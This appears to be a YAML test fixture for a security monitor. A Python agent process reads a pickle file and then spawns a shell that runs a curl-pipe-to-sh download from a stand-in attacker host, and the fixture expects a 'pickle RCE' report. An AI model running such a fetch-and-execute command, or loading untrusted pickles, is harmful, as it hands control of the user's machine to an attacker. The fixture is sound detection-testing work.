subjects:
  python:
    session: pid/100:1
    program: /usr/bin/python3
    name: python3
    agent: true
    actors: [{id: u1, name: Dev, email: dev@example.com}]
    device: dev-1
    source: probe
  payload:
    session: pid/101:1
    parent: python
    program: /bin/sh
    actors: [{id: u1, name: Dev}]
    device: dev-1
    source: probe
observations:
  - {kind: session_start, subject: python}
  - {kind: file_read, subject: python, path: /Users/dev/proj/storage/bgem3/multi_embed_store.pkl}
  - {kind: spawn, subject: payload, cmdline: "sh -c 'curl -s http://evil.example/p | sh'"}
expect:
  action: report
  reason_contains: "pickle RCE"
  chain_min: 2
